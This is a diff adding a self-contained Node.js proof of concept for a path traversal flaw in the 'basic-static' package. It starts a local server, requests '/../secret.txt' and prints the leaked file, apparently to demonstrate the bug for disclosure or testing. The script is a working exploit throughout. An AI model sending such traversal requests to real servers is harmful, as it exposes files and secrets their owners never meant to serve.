@@ -1,0 +1,31 @@
+```javascript
+const http = require('http');
+const path = require('path');
+const fs = require('fs');
+const basicStatic = require('./node_modules/basic-static');
+
+// Set up a "public" directory meant to be the only thing served,
+// and a "secret" file outside of it that should NOT be reachable.
+const rootDir = path.join(__dirname, 'public');
+fs.mkdirSync(rootDir, { recursive: true });
+fs.writeFileSync(path.join(rootDir, 'hello.txt'), 'public content');
+fs.writeFileSync(path.join(__dirname, 'secret.txt'), 'TOP SECRET DATA');
+
+// basic-static builds basePath via path.join(rootDir, url.parse(req.url).pathname)
+// with no sanitization of ".." segments, allowing path traversal outside rootDir.
+const server = http.createServer(basicStatic({ rootDir }));
+
+server.listen(0, () => {
+  const port = server.address().port;
+
+  http.get({ host: '127.0.0.1', port, path: '/../secret.txt' }, (res) => {
+    let body = '';
+    res.on('data', (chunk) => (body += chunk));
+    res.on('end', () => {
+      console.log('HTTP status:', res.statusCode);
+      console.log('Leaked file contents:', body);
+      server.close();
+    });
+  });
+});
+```
